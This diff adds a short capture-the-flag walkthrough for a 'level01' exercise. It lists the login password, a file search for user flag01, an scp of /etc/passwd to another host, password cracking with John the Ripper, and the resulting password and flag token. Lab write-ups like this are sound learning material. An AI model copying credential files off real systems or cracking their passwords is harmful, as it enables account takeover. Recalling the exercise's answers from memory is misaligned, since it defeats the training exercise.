@@ -1,0 +1,11 @@
+- Connect with login: "level01" and password: "x24ti5gi3x0ol2eh4esiuxias"
+- Try to find flag01 password > search for his files
+- find / -user flag01 2>/dev/null
+	nothing
+- time to use john the ripper
+- scp /etc/passwd herrfalco@192.168.1.?:/?
+- john passwd --show
+	abcdefg
+- log to flag01
+- getflag
+	f2av5il02puano7naaf6adaaf
